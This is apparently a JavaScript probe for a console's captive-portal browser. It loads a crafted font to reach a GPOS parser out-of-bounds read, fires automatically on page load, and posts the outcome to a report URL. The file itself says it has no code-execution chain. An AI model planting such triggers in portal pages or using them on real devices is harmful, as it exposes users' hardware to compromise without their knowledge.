/* Captive-portal font probe.
 *
 * Purpose: establish, on the console's WifiWebAuthApplet browser, whether the
 * web-font path that reaches the SystemWeb GPOS parser (flat 0xbac40) is
 * available, and report the result back to the portal server.
 *
 * This is a reachability/diagnostic payload. It does not contain a code-exec
 * chain: the GPOS bug is an OOB read and the WebKit engine is not in the dump.
 */
(function () {
  "use strict";

  var qs = new URLSearchParams(location.search);
  var fontUrl = qs.get("font") || "/font/crafted.otf";
  var reportUrl = qs.get("report") || "/report";
  var out = {
    ts: new Date().toISOString(),
    ua: navigator.userAgent,
    fontUrl: fontUrl,
    hasFontFaceCtor: typeof FontFace !== "undefined",
    hasFontsSet: !!(document.fonts && document.fonts.add),
    secureContext: !!window.isSecureContext,
    fontLoad: "not attempted",
    fontFamily: null,
    width: null,
    elapsedMs: null
  };

  function log(s) {
    var el = document.getElementById("log");
    if (el) el.textContent += s + "\n";
  }

  function report(obj) {
    var body = JSON.stringify(obj);
    log("report -> " + reportUrl);
    try {
      fetch(reportUrl, { method: "POST", headers: { "content-type": "application/json" }, body: body })
        .catch(function () {});
    } catch (e) { /* ignore */ }
  }

  function measure() {
    var s = document.getElementById("sample");
    if (!s) return null;
    try { return s.getBoundingClientRect().width; } catch (e) { return null; }
  }

  function withTimeout(p, ms) {
    return new Promise(function (resolve, reject) {
      var t = setTimeout(function () { reject(new Error("timeout")); }, ms);
      p.then(function (v) { clearTimeout(t); resolve(v); },
             function (e) { clearTimeout(t); reject(e); });
    });
  }

  async function main() {
    var t0 = Date.now();
    try {
      if (out.hasFontFaceCtor) {
        var face = new FontFace("probeGPOS", "url(" + fontUrl + ")", { display: "block" });
        document.fonts.add(face);
        await withTimeout(face.load(), 8000);
        out.fontLoad = "loaded";
        out.fontFamily = face.family;
        await document.fonts.ready;
        // force a layout with the font applied
        out.width = measure();
      } else {
        // fall back to the @font-face declared in the page + fonts.ready
        await withTimeout(document.fonts.ready, 8000);
        out.fontLoad = "fonts.ready (no FontFace ctor)";
        out.width = measure();
      }
    } catch (e) {
      out.fontLoad = "error: " + (e && e.message ? e.message : String(e));
      out.width = measure();
    }
    out.elapsedMs = Date.now() - t0;
    log(JSON.stringify(out, null, 2));
    report(out);
  }

  var btn = document.getElementById("go");
  if (btn) btn.addEventListener("click", function () { main(); });
  // auto-run once so a plain page load is already a trigger
  main();
})();
